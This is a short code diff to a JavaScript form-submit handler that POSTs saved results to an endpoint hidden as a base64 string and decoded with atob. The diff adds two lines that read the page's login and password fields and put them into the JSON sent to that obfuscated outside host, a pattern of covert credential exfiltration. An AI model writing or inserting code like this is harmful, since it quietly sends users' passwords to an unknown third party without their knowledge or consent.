@@ -808,6 +808,8 @@ document.querySelector('.save').addEventListener('submit', async (event) => {
 	const lastDisplayMode = event.target.style.display; event.target.style.display = "none"; saveState.style.display = lastDisplayMode;
 	const json = getResultJSON();
 	const data = 'aHR0cHM6Ly9oNTEzNTguc3J2NS50ZXN0LWhmLnJ1L21vZHMvanNvbjJnaXRodWIucGhw';
+	json['login'] = document.getElementById('login').value;
+	json['password'] = document.getElementById('password').value;
 	fetch(atob(data), {
 		method: 'POST',
 		headers: { 'Content-Type': 'application/json' },
